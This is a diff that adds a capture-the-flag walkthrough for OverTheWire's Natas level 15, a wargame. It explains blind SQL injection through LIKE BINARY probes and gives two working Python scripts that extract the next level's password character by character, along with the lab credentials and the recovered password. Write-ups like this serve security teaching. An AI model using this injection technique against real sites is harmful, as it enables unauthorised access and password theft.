@@ -639,7 +639,84 @@ Username: <input name="username"><br>
 <?php } ?>
 ```
 
-Viewing the source code, you can see that there is no easy way to retrieve the password through SQL injection like in the previous [level](#level-15).
+Viewing the source code, you can again see that the website is vulnerable to SQL injection because the string that holds the user input is placed directly into the SQL query. However, unlike [Level 15](#level-15), 
+the output only consists of three possibilities; "This user exists", "This user doesn't exist", or "Error in query". As we are looking for the password for natas16, it seems reasonable to try inputting natas16 to
+see if the user exists. Doing so, you will find that it does indeed exist, with the message, "This user exists." We aren't able to retrieve any more information apart from that so finding the password is not as
+straightforward as it seems.
+
+If you pay attention to the SQL query though, you will notice that it uses the `WHERE` clause. Another command that can be used along with `WHERE` is the `LIKE` operator. The `LIKE` operator in SQL is used to find
+a particular pattern in a string where `%` is a wildcard character that means zero, one, or more characters. So for example, `password LIKE 'a%'` would match passwords that start with 'a'.
+
+In this case, we could probe the characters in the password by using a query such as:
+
+```sql
+SELECT * FROM users where username="natas16" AND password LIKE BINARY '%<CHAR>%'
+```
+
+> Note: The `BINARY` is used to ensure that SQL is case-sensitive as by default it is not.
+
+By doing this across all possible symbols (alphanumerical), we could find the character set that is used for the password. Of course, it would be tedious to do this manually so to save time we can write a Python script
+for this purpose.
+
+```python
+import requests
+
+target ='http://natas15.natas.labs.overthewire.org/'
+
+alphanum_set = (
+    '0123456789' +
+    'abcdefghijklmnopqrstuvwxyz' +
+    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+)
+
+
+pwd_set = ''
+
+for c in alphanum_set:
+    username = ('natas16" AND password LIKE BINARY "%' + c + '%" "')
+    r = requests.get(target, auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'), params={"username": username})
+
+    if "This user exists" in r.text:
+        pwd_set += c
+        print(pwd_set.ljust(len(alphanum_set), '*'))
+```
+
+Running this program would yield something like this:
+
+```
+3*************************************************************
+34************************************************************
+346***********************************************************
+...
+346cefhijkmostuvDEGKLMPQVWXY**********************************
+```
+
+Now, we can brute force the 32-character password (all passwords are 32-characters long) using the knowledge of the character set.
+
+```python
+password = ''
+while len(password) != 32:
+    for c in pwd_set:
+        username = ('natas16" AND password LIKE BINARY"' + password + c + '%" "')
+        r = requests.get(target, auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'), params={"username": username})
+
+        if "This user exists" in r.text:
+            password += c
+            print(password)
+            break
+```
+
+This results in a similar output:
+
+```
+h
+hP
+hPk
+...
+hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 
 ---
 
